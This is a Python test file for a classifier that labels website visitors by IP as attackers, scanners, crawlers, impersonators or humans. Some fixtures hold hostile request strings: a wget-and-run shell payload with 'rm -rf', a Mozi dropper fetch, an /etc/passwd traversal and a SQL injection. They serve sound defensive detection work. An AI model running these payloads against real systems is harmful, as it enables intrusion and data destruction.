"""Tests for classify_ip(), set_visitor_class(), and backfill_visitor_classes()."""

import pytest

from src.db import get_conn
from src.queries import (
    backfill_visitor_classes,
    classify_ip,
    insert_visit,
    set_visitor_class,
    upsert_ip_intel,
)

# ── Helpers ───────────────────────────────────────────────────────────────────


@pytest.fixture
def configured_site(monkeypatch):
    """Give the classifier a site to compare against.

    SITE_BASE_URL and JS_ONLY_PATH_PREFIXES describe the watched site, so they
    ship empty and both signals are off until somebody names one. Tests that
    exercise internal navigation or JS-fetch evidence have to say which site they
    mean — otherwise they assert against a switched-off feature and pass for the
    wrong reason.
    """
    from src import config

    monkeypatch.setattr(config.settings, "site_base_url", "https://example.com")
    monkeypatch.setattr(config.settings, "js_only_path_prefixes", ["/assets/pages/"])
    return config.settings


def _visit(conn, ip, path="/", method="GET", status=200, **kw):
    insert_visit(
        conn, ip=ip, timestamp="2026-06-10T10:00:00", method=method, path=path, status=status, **kw
    )


def _intel(conn, ip, **kw):
    upsert_ip_intel(conn, {"ip": ip, **kw})


# ── Threats ───────────────────────────────────────────────────────────────────


def test_protocol_abusers_shell_payload(tmp_db):
    """A non-HTTP request line carrying a shell command is an attack, not a mismatch."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "1.1.1.1",
            path="GET /shell?cd+/tmp;rm+-rf+*;wget+http://1.2.3.4/bin",
            method="NON-HTTP",
        )
        _intel(conn, "1.1.1.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.1") == "threats/protocol-abusers"


def test_protocol_abusers_mozi_dropper(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "1.1.1.3", path="27;wget%20http://x:80/Mozi.m%20-O%20-", method="NON-HTTP")
        _intel(conn, "1.1.1.3")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.3") == "threats/protocol-abusers"


def test_tls_handshake_is_a_mismatch_not_a_threat(tmp_db):
    """HTTPS spoken to the plain-HTTP port is a misdirected client, not an attack."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "1.1.1.2", path="[handshake on HTTP port]", method="TLS")
        _intel(conn, "1.1.1.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.2") == "automated/protocol-mismatch"


def test_binary_payload_is_a_mismatch(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "1.1.1.4", path="[binary payload]", method="NON-HTTP")
        _intel(conn, "1.1.1.4")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.4") == "automated/protocol-mismatch"


def test_empty_request_is_a_mismatch(tmp_db):
    """Previously matched no rule at all and silently fell through to unknown."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "1.1.1.5", path="[empty request]", method="UNKNOWN")
        _intel(conn, "1.1.1.5")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.5") == "automated/protocol-mismatch"


def test_probing_outranks_protocol_mismatch(tmp_db):
    """A scanner that also mis-speaks the protocol is still a scanner."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "1.1.1.6", path="[handshake on HTTP port]", method="TLS")
        _visit(conn, "1.1.1.6", path="/.env", status=404)
        _intel(conn, "1.1.1.6")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "1.1.1.6") == "bots/vulnerability-probers"


def test_exploit_probers_etc_passwd(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "2.2.2.1", path="/../../etc/passwd")
        _intel(conn, "2.2.2.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "2.2.2.1") == "threats/exploit-probers"


def test_exploit_probers_sqli(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "2.2.2.2", path="/?id=1 UNION SELECT 1,2,3 FROM users")
        _intel(conn, "2.2.2.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "2.2.2.2") == "threats/exploit-probers"


# ── Network/reputation are signals, not identities ─────────────────────────────
# Tor / proxy / DNSBL are stored as signal columns and never become a visitor_class.
# Without behavioral or browser evidence the identity stays 'unknown'.


def test_tor_only_is_unknown(tmp_db):
    """Tor is a signal — a Tor exit with no other evidence has unknown identity."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "3.3.3.1", path="/")
        _intel(conn, "3.3.3.1", is_tor=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "3.3.3.1") == "unknown"


def test_dnsbl_only_is_unknown(tmp_db):
    """DNSBL is a reputation signal, not an identity."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "4.4.4.1", path="/")
        _intel(conn, "4.4.4.1", dnsbl_listed=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "4.4.4.1") == "unknown"


# ── Vulnerability probers ─────────────────────────────────────────────────────


def test_vulnerability_prober_scanner_path(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "5.5.5.1", path="/.env", status=404)
        _intel(conn, "5.5.5.1", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "5.5.5.1") == "bots/vulnerability-probers"


def test_vulnerability_prober_wp_admin(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "5.5.5.2", path="/wp-admin/", status=404)
        _intel(conn, "5.5.5.2", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "5.5.5.2") == "bots/vulnerability-probers"


def test_vulnerability_prober_high_404_rate(tmp_db):
    with get_conn(tmp_db) as conn:
        for i in range(8):
            _visit(conn, "5.5.5.3", path=f"/random{i}", status=404)
        _visit(conn, "5.5.5.3", path="/", status=200)
        _intel(conn, "5.5.5.3", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "5.5.5.3") == "bots/vulnerability-probers"


def test_vulnerability_prober_beats_desktop_ua(tmp_db):
    """Scanner paths take priority even when UA looks like a desktop browser."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "5.5.5.4",
            path="/.git/config",
            status=200,
            device="Desktop",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        )
        _intel(conn, "5.5.5.4", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "5.5.5.4") == "bots/vulnerability-probers"


# ── Known bots ────────────────────────────────────────────────────────────────


def test_security_researcher_shodan_rdns(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "6.6.6.1", path="/")
        _intel(conn, "6.6.6.1", reverse_dns="crawler.shodan.io", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "6.6.6.1") == "bots/security-researchers"


def test_security_researcher_censys_ua(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "6.6.6.2", path="/", user_agent="Mozilla/5.0 (compatible; CensysInspect/1.1)")
        _intel(conn, "6.6.6.2", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "6.6.6.2") == "bots/security-researchers"


def test_shodan_scanner_tag_does_not_decide_identity(tmp_db):
    """A Shodan tag describes the services *that IP* exposes — often a compromised
    host — not who is visiting us. It stays a signal; identity comes from behaviour."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "6.6.6.3", path="/")
        _intel(conn, "6.6.6.3", tags="scanner,honeypot", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "6.6.6.3") == "automated/datacenter"


def test_scanning_tool_is_not_a_named_researcher(tmp_db):
    """zgrab is a library anyone can run; it names the tool, not the operator."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "6.6.6.4", path="/", user_agent="Mozilla/5.0 zgrab/0.x")
        _intel(conn, "6.6.6.4", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "6.6.6.4") == "bots/scanning-tools"


def test_named_researcher_beats_scanning_tool(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "6.6.6.5", path="/", user_agent="CensysInspect/1.1 zgrab/0.x")
        _intel(conn, "6.6.6.5", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "6.6.6.5") == "bots/security-researchers"


def test_search_crawler_googlebot_rdns(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "7.7.7.1", path="/")
        _intel(conn, "7.7.7.1", reverse_dns="crawl-66-249-66-1.googlebot.com", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "7.7.7.1") == "bots/search-crawlers"


def test_search_crawler_bingbot_ua_off_hosting(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "7.7.7.2", path="/", user_agent="Mozilla/5.0 (compatible; bingbot/2.0)")
        _intel(conn, "7.7.7.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "7.7.7.2") == "bots/search-crawlers"


def test_search_crawler_seznambot(tmp_db):
    """A real search engine that used to land in generic-bots."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "7.7.7.3", path="/", user_agent="Mozilla/5.0 (compatible; SeznamBot/4.0)")
        _intel(conn, "7.7.7.3")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "7.7.7.3") == "bots/search-crawlers"


def test_googlebot_claim_from_cloud_ip_is_an_impersonator(tmp_db):
    """Real Googlebot runs on Google's network with confirming rDNS. A DigitalOcean
    box claiming the UA is the standard scraper disguise."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "7.7.7.4", path="/", user_agent="Mozilla/5.0 (compatible; Googlebot/2.1)")
        _intel(conn, "7.7.7.4", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "7.7.7.4") == "bots/impersonators"


def test_googlebot_with_confirming_rdns_is_a_crawler(tmp_db):
    """rDNS wins over the hosting flag — Google's own ranges are hosting too."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "7.7.7.5", path="/", user_agent="Mozilla/5.0 (compatible; Googlebot/2.1)")
        _intel(conn, "7.7.7.5", reverse_dns="crawl-66-249-66-1.googlebot.com", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "7.7.7.5") == "bots/search-crawlers"


def test_ai_crawler_gptbot(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.8.1", path="/", user_agent="GPTBot/1.0")
        _intel(conn, "8.8.8.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.8.1") == "bots/ai-crawlers"


def test_ai_crawler_claudebot_rdns_confirms_on_hosting(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.8.2", path="/", user_agent="ClaudeBot/1.0")
        _intel(conn, "8.8.8.2", reverse_dns="crawler.anthropic.com", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.8.2") == "bots/ai-crawlers"


def test_ai_crawler_claim_from_unrelated_cloud_is_an_impersonator(tmp_db):
    """Nothing corroborates the claim: no reverse DNS, and a network owner that is
    neither Anthropic nor a platform Anthropic crawls from."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.8.3", path="/", user_agent="ClaudeBot/1.0")
        _intel(conn, "8.8.8.3", is_hosting=1, org="Hostodo", asn="AS399804 Hostodo")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.8.3") == "bots/impersonators"


def test_applebot_reverse_dns_confirms_the_crawler(tmp_db):
    """Apple publishes 17-x-x-x.applebot.apple.com. The needle list named "applebot"
    among the user-agents but nothing among the hostnames, so 22 production addresses
    that Apple's own PTR record vouched for were filed as impersonators."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.9.1", path="/", user_agent="Mozilla/5.0 (Macintosh) Applebot/0.1")
        _intel(conn, "8.8.9.1", reverse_dns="17-241-227-25.applebot.apple.com", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.9.1") == "bots/ai-crawlers"


def test_openai_crawler_on_azure_is_verified_by_its_network_owner(tmp_db):
    """OpenAI crawls from Azure and publishes no PTR record, so rDNS alone had
    nothing to work with: 41 production addresses running GPTBot and OAI-SearchBot
    were impersonators until the network owner became part of the check."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.9.2", path="/", user_agent="Mozilla/5.0 (compatible; GPTBot/1.4)")
        _intel(conn, "8.8.9.2", is_hosting=1, org="Cloud", asn="AS8075 Microsoft Corporation")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.9.2") == "bots/ai-crawlers"


def test_claudebot_on_aws_under_its_own_org_is_verified(tmp_db):
    """The ASN is Amazon's, but ip-api names Anthropic as the org — which is the
    operator-owned half of the check, not the platform half."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.9.3", path="/", user_agent="Mozilla/5.0 (compatible; ClaudeBot/1.0)")
        _intel(conn, "8.8.9.3", is_hosting=1, org="Anthropic, PBC", asn="AS16509 Amazon.com, Inc.")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.9.3") == "bots/ai-crawlers"


def test_seznambot_without_rdns_is_verified_by_its_asn(tmp_db):
    """Same check on the search side."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.9.4", path="/", user_agent="Mozilla/5.0 (compatible; SeznamBot/4.0)")
        _intel(conn, "8.8.9.4", is_hosting=1, org="Seznam.cz", asn="AS43037 Seznam.cz, a.s.")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.9.4") == "bots/search-crawlers"


def test_unverifiable_claim_is_not_reported_as_a_disproven_one(tmp_db):
    """Both land in impersonators, but the detail page must not say reverse DNS
    pointed elsewhere when there was no reverse DNS to point anywhere."""
    from src.queries import explain_classification

    with get_conn(tmp_db) as conn:
        _visit(conn, "8.8.9.5", path="/", user_agent="Mozilla/5.0 (compatible; GPTBot/1.4)")
        _intel(conn, "8.8.9.5", is_hosting=1, org="BuyVM", asn="AS53667 FranTech Solutions")
        _visit(conn, "8.8.9.6", path="/", user_agent="Mozilla/5.0 (compatible; GPTBot/1.4)")
        _intel(conn, "8.8.9.6", is_hosting=1, org="BuyVM", reverse_dns="mail.example.net")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "8.8.9.5") == "bots/impersonators"
        assert classify_ip(conn, "8.8.9.6") == "bots/impersonators"
        absent = explain_classification(conn, "8.8.9.5")[0]
        contradicted = explain_classification(conn, "8.8.9.6")[0]
    assert "neither the operator nor a network it crawls from" in absent["text"]
    assert absent["source"] == "ip-api"
    assert "points somewhere else" in contradicted["text"]
    assert contradicted["source"] == "reverse_dns"


def test_seo_tool_ahrefsbot(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "9.9.9.1", path="/", user_agent="AhrefsBot/7.0")
        _intel(conn, "9.9.9.1", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "9.9.9.1") == "bots/seo-tools"


# ── Humans ────────────────────────────────────────────────────────────────────


def _human_visit(conn, ip, sec_fetch_site="none", referer="", **kw):
    _visit(
        conn,
        ip,
        path="/",
        status=200,
        sec_fetch_mode="navigate",
        sec_fetch_dest="document",
        sec_fetch_site=sec_fetch_site,
        accept_encoding="gzip, deflate, br, zstd",
        http_version="HTTP/2.0",
        accept_language="de-DE,de;q=0.9",
        referer=referer,
        **kw,
    )
    _visit(
        conn,
        ip,
        path="/about",
        status=200,
        sec_fetch_mode="navigate",
        sec_fetch_dest="document",
        sec_fetch_site=sec_fetch_site,
        accept_encoding="gzip, deflate, br, zstd",
        http_version="HTTP/2.0",
        accept_language="de-DE,de;q=0.9",
        referer=referer,
        **kw,
    )


def test_human_browser_direct(tmp_db):
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "10.0.0.1", sec_fetch_site="none")
        _intel(conn, "10.0.0.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "10.0.0.1") == "humans/browser-direct"


def test_human_browser_referred(tmp_db):
    with get_conn(tmp_db) as conn:
        _human_visit(
            conn,
            "10.0.0.2",
            sec_fetch_site="cross-site",
            referer="https://google.com/search?q=test",
        )
        _intel(conn, "10.0.0.2")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "10.0.0.2") == "humans/browser-referred"


def test_human_browser_internal_nav(tmp_db):
    with get_conn(tmp_db) as conn:
        # No configured site needed: sec_fetch_site='same-origin' is the first
        # branch of the CASE and settles it before any host comparison. The
        # referer is here for realism only.
        _human_visit(
            conn, "10.0.0.3", sec_fetch_site="same-origin", referer="https://example.com/"
        )
        _intel(conn, "10.0.0.3")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "10.0.0.3") == "humans/browser-internal-nav"


def test_internal_nav_respects_configured_site_base_url(tmp_db, monkeypatch):
    """The internal-nav referer check uses settings.site_base_url, not a hardcoded domain."""
    from src import config

    monkeypatch.setattr(config.settings, "site_base_url", "https://example.org")
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "10.0.0.9", sec_fetch_site="none", referer="https://example.org/start")
        _intel(conn, "10.0.0.9")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "10.0.0.9") == "humans/browser-internal-nav"


def test_human_via_zstd_signal(tmp_db):
    """zstd alone (without sec_fetch) qualifies as a human signal."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "10.0.0.4",
            path="/",
            status=200,
            accept_encoding="gzip, deflate, br, zstd",
            http_version="HTTP/2.0",
        )
        _visit(
            conn,
            "10.0.0.4",
            path="/about",
            status=200,
            accept_encoding="gzip, deflate, br, zstd",
            http_version="HTTP/2.0",
        )
        _intel(conn, "10.0.0.4")
    with get_conn(tmp_db) as conn:
        result = classify_ip(conn, "10.0.0.4")
        assert result.startswith("humans/")


def test_human_single_page_with_sec_fetch_qualifies(tmp_db):
    """A single page carrying Sec-Fetch (a real-browser-only signal) IS human."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "10.0.0.5",
            path="/",
            status=200,
            sec_fetch_mode="navigate",
            sec_fetch_dest="document",
            accept_encoding="gzip, deflate, br, zstd",
            http_version="HTTP/2.0",
        )
        _intel(conn, "10.0.0.5")
    with get_conn(tmp_db) as conn:
        result = classify_ip(conn, "10.0.0.5")
        assert result.startswith("humans/")


def test_human_single_page_weak_signals_not_qualified(tmp_db):
    """A single page with only weak signals (http2/zstd, no Sec-Fetch) is NOT human."""
    with get_conn(tmp_db) as conn:
        _visit(
            conn,
            "10.0.0.15",
            path="/",
            status=200,
            accept_encoding="gzip, deflate, br, zstd",
            http_version="HTTP/2.0",
        )
        _intel(conn, "10.0.0.15")
    with get_conn(tmp_db) as conn:
        result = classify_ip(conn, "10.0.0.15")
        assert not result.startswith("humans/")


def test_human_scanner_path_disqualifies(tmp_db):
    """An IP with browser signals but scanner paths is NOT classified as human."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "10.0.0.6")
        _visit(conn, "10.0.0.6", path="/.env", status=404)
        _intel(conn, "10.0.0.6")
    with get_conn(tmp_db) as conn:
        result = classify_ip(conn, "10.0.0.6")
        assert result == "bots/vulnerability-probers"


# ── Automated / datacenter (network-only fallback) ─────────────────────────────


def test_proxy_only_is_unknown(tmp_db):
    """Proxy without hosting could carry a human — identity stays unknown (proxy signal)."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "11.1.1.1", path="/")
        _intel(conn, "11.1.1.1", is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.1.1.1") == "unknown"


def test_hosting_only_is_automated(tmp_db):
    """A datacenter/cloud IP with no human or bot evidence is automated/datacenter."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "12.1.1.1", path="/")
        _intel(conn, "12.1.1.1", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "12.1.1.1") == "automated/datacenter"


def test_hosting_with_vpn_tag_is_automated(tmp_db):
    """Hosting flag drives the automated label even when a vpn tag is present."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "11.1.1.2", path="/")
        _intel(conn, "11.1.1.2", tags="vpn", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.1.1.2") == "automated/datacenter"


# ── Identity vs. signal: network/reputation never downgrades a real human ───────


def test_human_on_proxy_stays_human(tmp_db):
    """A human on a VPN keeps its identity — proxy is a signal, not the class."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.1")
        _intel(conn, "11.2.2.1", is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.1") == "humans/browser-direct"


def test_browser_on_cloud_ip_is_a_headless_browser(tmp_db):
    """A browser engine driven from a datacenter is automation, not a person.
    Measured: 127 of 252 IPs the old gate called human sat on Alibaba/DigitalOcean/
    Amazon ranges with no VPN flag."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.2")
        _intel(conn, "11.2.2.2", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.2") == "automated/headless-browser"


def test_proxy_flag_is_no_exemption_from_the_hosting_rule(tmp_db):
    """v3 exempted hosting IPs that also carried the proxy flag, assuming those were
    consumer VPNs. Measured against a live log: all 61 hosting IPs labelled human carried
    the proxy flag, so the exemption exempted every one of them. v6 reopened the
    class for datacenter addresses, but on behaviour rather than on reputation —
    the proxy flag still buys nothing on its own."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.3")
        _intel(conn, "11.2.2.3", is_hosting=1, is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.3") == "automated/headless-browser"


def _reading_visitor(conn, ip, pages=("/", "/about", "/contact"), internal=True, status=200):
    """Somebody moving through the site: navigations that came from it.

    internal=False keeps the browser evidence and drops both halves of the
    internal-nav test — the Sec-Fetch header and the referer each satisfy it
    on their own."""
    for path in pages:
        _visit(
            conn,
            ip,
            path=path,
            status=status,
            sec_fetch_mode="navigate",
            sec_fetch_dest="document",
            sec_fetch_site="same-origin" if internal else "none",
            accept_encoding="gzip, deflate, br, zstd",
            http_version="HTTP/2.0",
            accept_language="de-DE,de;q=0.9",
            referer="https://example.com/" if internal else "",
        )


def test_vpn_user_who_reads_the_site_is_human(tmp_db):
    """A commercial VPN exit is a datacenter, so v3-v5 filed every person behind one
    as a driven browser. Behaviour reopens the class: internal navigation across
    three pages with nothing missing requested. Twenty production addresses qualify;
    Datacamp (NordVPN, Surfshark), M247 and Akamai (iCloud Private Relay)."""
    with get_conn(tmp_db) as conn:
        _reading_visitor(conn, "11.2.4.1")
        _intel(conn, "11.2.4.1", is_hosting=1, is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.4.1") == "humans/browser-internal-nav"


def test_datacenter_browser_that_probes_stays_automation(tmp_db):
    """Internal navigation alone is not enough. Eight production addresses navigate
    internally *and* request missing paths — every one a scanner on Google Cloud.

    One miss in ten requests is below _PROBE_404_RATE and under
    _DISTINCT_404_PATHS_FOR_PROBER, so no prober rule fires and the address reaches
    the browser rule: exactly the patient scanner the carve-out has to refuse."""
    with get_conn(tmp_db) as conn:
        _reading_visitor(conn, "11.2.4.2", pages=tuple(f"/p{i}" for i in range(9)))
        _visit(conn, "11.2.4.2", path="/no-such-page", status=404)
        _intel(conn, "11.2.4.2", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.4.2") == "automated/headless-browser"


def test_datacenter_browser_below_the_page_floor_stays_automation(tmp_db):
    """Two pages is where single-page infrastructure starts slipping through:
    dropping the floor to 2 admits seventeen more addresses, fifteen of them
    CenturyLink, Microsoft and DigitalOcean touching one path."""
    with get_conn(tmp_db) as conn:
        _reading_visitor(conn, "11.2.4.3", pages=("/", "/about"))
        _intel(conn, "11.2.4.3", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.4.3") == "automated/headless-browser"


def test_datacenter_browser_without_internal_nav_stays_automation(tmp_db):
    """Three pages fetched without ever coming from the site is a list being worked
    through, not a visit being navigated."""
    with get_conn(tmp_db) as conn:
        _reading_visitor(conn, "11.2.4.4", internal=False)
        _intel(conn, "11.2.4.4", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.4.4") == "automated/headless-browser"


def test_reading_from_a_consumer_line_needs_no_carve_out(tmp_db):
    """The carve-out is scoped to hosting addresses; it must not alter anyone else."""
    with get_conn(tmp_db) as conn:
        _reading_visitor(conn, "11.2.4.5")
        _intel(conn, "11.2.4.5")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.4.5") == "humans/browser-internal-nav"


def test_human_on_a_plain_proxy_stays_human(tmp_db):
    """Proxy *without* hosting is still a person — reputation alone never demotes."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.4")
        _intel(conn, "11.2.2.4", is_proxy=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.4") == "humans/browser-direct"


def test_dnsbl_listed_browser_stays_human(tmp_db):
    """DNSBL reputation does not override a real browser."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.3")
        _intel(conn, "11.2.2.3", dnsbl_listed=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.3") == "humans/browser-direct"


def test_exploit_probe_beats_browser(tmp_db):
    """Behavioral threat outranks browser-looking signals."""
    with get_conn(tmp_db) as conn:
        _human_visit(conn, "11.2.2.4")
        _visit(conn, "11.2.2.4", path="/../../etc/passwd", status=404)
        _intel(conn, "11.2.2.4", is_hosting=1)
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "11.2.2.4") == "threats/exploit-probers"


# ── Generic bots / unknown ────────────────────────────────────────────────────


def test_generic_bot_device(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "13.1.1.1", path="/", device="Bot", user_agent="SomeUnknownBot/1.0")
        _intel(conn, "13.1.1.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "13.1.1.1") == "bots/generic-bots"


def test_unknown_no_signals(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "14.1.1.1", path="/")
        _intel(conn, "14.1.1.1")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "14.1.1.1") == "unknown"


def test_unknown_no_intel(tmp_db):
    """IP with no ip_intel entry returns unknown."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "14.1.1.2", path="/")
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "14.1.1.2") == "unknown"


def test_unknown_no_visits(tmp_db):
    """classify_ip for an IP with no visits at all returns unknown."""
    with get_conn(tmp_db) as conn:
        assert classify_ip(conn, "99.99.99.99") == "unknown"


# ── set_visitor_class / backfill ──────────────────────────────────────────────


def test_set_visitor_class(tmp_db):
    with get_conn(tmp_db) as conn:
        _intel(conn, "20.1.1.1")
        set_visitor_class(conn, "20.1.1.1", "humans/browser-direct")
    with get_conn(tmp_db) as conn:
        row = conn.execute(
            "SELECT visitor_class FROM ip_intel WHERE ip = ?", ("20.1.1.1",)
        ).fetchone()
        assert row[0] == "humans/browser-direct"


def test_backfill_visitor_classes(tmp_db):
    with get_conn(tmp_db) as conn:
        _visit(conn, "21.1.1.1", path="/")
        _intel(conn, "21.1.1.1")
        _visit(conn, "21.1.1.2", path="/", device="Bot", user_agent="TestBot/1.0")
        _intel(conn, "21.1.1.2")
    with get_conn(tmp_db) as conn:
        count = backfill_visitor_classes(conn)
        assert count == 2
        rows = conn.execute("SELECT ip, visitor_class FROM ip_intel ORDER BY ip").fetchall()
        classes = {r[0]: r[1] for r in rows}
        assert classes["21.1.1.1"] != ""
        assert classes["21.1.1.2"] != ""


def test_backfill_skips_already_classified(tmp_db):
    with get_conn(tmp_db) as conn:
        _intel(conn, "22.1.1.1")
        set_visitor_class(conn, "22.1.1.1", "humans/browser-direct")
    with get_conn(tmp_db) as conn:
        count = backfill_visitor_classes(conn)
        assert count == 0


def test_force_reclassify_all_overwrites_stale_label(tmp_db):
    """Unlike backfill, force_reclassify_all re-evaluates already-labeled IPs."""
    from src.queries import force_reclassify_all

    with get_conn(tmp_db) as conn:
        _visit(conn, "23.1.1.1", path="/")
        _intel(conn, "23.1.1.1", is_hosting=1)
        # stamp a stale label from the old taxonomy
        set_visitor_class(conn, "23.1.1.1", "infrastructure/hosting-cloud")
    with get_conn(tmp_db) as conn:
        assert backfill_visitor_classes(conn) == 0  # backfill leaves it alone
        count = force_reclassify_all(conn)
        assert count == 1
        row = conn.execute(
            "SELECT visitor_class FROM ip_intel WHERE ip = ?", ("23.1.1.1",)
        ).fetchone()
        assert row[0] == "automated/datacenter"


def test_upsert_preserves_visitor_class(tmp_db):
    """Re-enriching an IP must not reset visitor_class."""
    with get_conn(tmp_db) as conn:
        _intel(conn, "23.1.1.1")
        set_visitor_class(conn, "23.1.1.1", "humans/browser-direct")
    with get_conn(tmp_db) as conn:
        upsert_ip_intel(conn, {"ip": "23.1.1.1", "country": "DE", "country_code": "DE"})
    with get_conn(tmp_db) as conn:
        row = conn.execute(
            "SELECT visitor_class FROM ip_intel WHERE ip = ?", ("23.1.1.1",)
        ).fetchone()
        assert row[0] == "humans/browser-direct"


# ── v3 detection fixes ────────────────────────────────────────────────────────


def test_path_containing_double_zero_is_not_an_exploit(tmp_db):
    """'%00' in the SQL was an f-string, so it emitted LIKE '%%00%' — "contains 00".
    Measured 102 IPs / 212,927 visits classified as threats by that alone."""
    with get_conn(tmp_db) as conn:
        _visit(conn, "30.0.0.1", path="/blog/2000-retrospective")
        _visit(conn, "30.0.0.2", path="/products/100")
        _intel(conn, "30.0.0.1")
        _intel(conn, "30.0.0.2")
    with get_conn(tmp_db) as conn:
        assert not classify_ip(conn, "30.0.0.1").startswith("threats/")
        assert not classify_ip(conn, "30.0.0.2").startswith("threats/")


